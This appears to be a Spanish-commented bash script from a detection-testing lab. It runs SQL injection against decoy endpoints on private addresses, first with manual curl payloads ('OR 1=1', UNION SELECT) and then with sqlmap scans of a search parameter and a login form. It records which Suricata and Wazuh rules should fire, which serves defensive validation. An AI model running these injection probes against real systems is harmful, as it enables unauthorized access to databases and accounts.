#!/bin/bash
# ============================================================================
# Escenario S04: SQL Injection (T1190)
# ============================================================================
# Herramientas: sqlmap
# Target: Decoy API endpoints vulnerables
# ============================================================================

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
mkdir -p "$EVIDENCE_DIR"

DECOY_API="http://10.20.0.20:8000"
DECOY_PORTAL="http://10.20.0.21:8000"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")

echo "=========================================="
echo "S04: SQL Injection (T1190)"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="

echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"

# 1. Manual SQL Injection
echo "[*] Fase 1: Manual SQL injection en Decoy Portal buscar"
curl -s "$DECOY_PORTAL/contribuyentes/buscar/?nit=1'+OR+'1'%3D'1" \
    -o "$EVIDENCE_DIR/sqli_manual_response.json"

curl -s "$DECOY_PORTAL/contribuyentes/buscar/?nit=1'+UNION+SELECT+1,2,3--" \
    -o "$EVIDENCE_DIR/sqli_union_response.json"

# 2. SQLMap contra el endpoint vulnerable
echo "[*] Fase 2: SQLMap scan"
timeout 180 sqlmap -u "$DECOY_PORTAL/contribuyentes/buscar/?nit=1*" \
    --batch --level=3 --risk=2 --timeout=10 \
    --output-dir="$EVIDENCE_DIR/sqlmap_output" 2>/dev/null || true

# 3. SQLMap contra login vulnerable
echo "[*] Fase 3: SQLMap contra login endpoint"
timeout 180 sqlmap -u "$DECOY_PORTAL/vuln/sqli-login/" \
    --data="username=admin&password=test" \
    --batch --level=3 --risk=2 --timeout=10 \
    --output-dir="$EVIDENCE_DIR/sqlmap_login_output" 2>/dev/null || true

END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
echo "$END_TIME" > "$EVIDENCE_DIR/end_time.txt"

cat > "$EVIDENCE_DIR/resultados.json" <<EOF
{
  "scenario": "S04-sql-injection",
  "technique_id": "T1190",
  "technique_name": "Exploit Public-Facing Application",
  "tactic": "Initial Access",
  "timestamp_start": "$TIMESTAMP",
  "timestamp_end": "$END_TIME",
  "tools_used": ["sqlmap", "curl"],
  "targets": ["$DECOY_PORTAL/contribuyentes/buscar/", "$DECOY_PORTAL/vuln/sqli-login/"],
  "evidence_files": [
    "sqli_manual_response.json",
    "sqli_union_response.json",
    "sqlmap_output/",
    "sqlmap_login_output/"
  ],
  "expected_detection": [
    "Suricata rule 2024010 (UNION SELECT)",
    "Suricata rule 2024011 (OR 1=1)",
    "Wazuh rule 100200 (SQL Injection)",
    "Decoy API attack_logger - T1190"
  ],
  "iso27035_phase": "Detection and Reporting (Phase 2)"
}
EOF

echo "[OK] Escenario S04 ejecutado."
